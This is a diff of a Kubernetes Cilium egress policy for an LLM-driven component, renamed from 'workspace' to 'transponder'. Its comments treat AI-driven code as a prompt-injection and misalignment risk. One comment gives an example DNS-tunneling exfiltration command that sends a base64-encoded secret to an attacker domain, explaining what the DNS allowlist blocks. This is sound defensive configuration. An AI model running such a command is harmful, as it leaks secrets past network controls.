@@ -1,8 +1,10 @@
-# Workspace egress envelope. The workspace is adversarial: LLM-driven
-# code under prompt-injection / tool-injection / misalignment risk. This
-# CNP is the SOLE workspace egress policy — it owns both L4 destinations
-# (kube-dns, tightbeam-ctrl, airlock-ctrl) AND the L7 DNS allowlist on
-# kube-dns. Default-deny otherwise.
+# Transponder egress envelope. The transponder is semi-adversarial
+# (it interprets LLM-driven streams); per ADR 018 the mainframe-runtime
+# sidecar is gone, and ALL tool execution (stdlib and tenant-defined
+# alike) flows through airlock-controller. This CNP is the SOLE
+# transponder egress policy — it owns both L4 destinations (kube-dns,
+# tightbeam-ctrl, airlock-ctrl) AND the L7 DNS allowlist on kube-dns.
+# Default-deny otherwise.
 #
 # Why a single CNP and not a K8s NetworkPolicy alongside: Cilium's
 # documented "L4 shadows L7" merge semantics
@@ -15,20 +17,19 @@
 # The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
 # workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
 # through the resolver chain even with no external IP egress reachable.
-# Only `tightbeam-ctrl.<ns>.svc.cluster.local` and
-# `airlock-ctrl.<ns>.svc.cluster.local` lookups are forwarded; all other
-# DNS queries drop at the Cilium L7 proxy before reaching kube-dns.
+# Only the two controller hostnames are forwarded; all other DNS
+# queries drop at the Cilium L7 proxy before reaching kube-dns.
 apiVersion: cilium.io/v2
 kind: CiliumNetworkPolicy
 metadata:
-  name: workspace-egress
+  name: transponder-egress
   namespace: {{ .Release.Namespace }}
   labels:
     {{- include "sycophant.labels" . | nindent 4 }}
 spec:
   endpointSelector:
     matchLabels:
-      app.kubernetes.io/component: workspace
+      app.kubernetes.io/component: transponder
       app.kubernetes.io/part-of: sycophant
   egress:
     - toEndpoints:
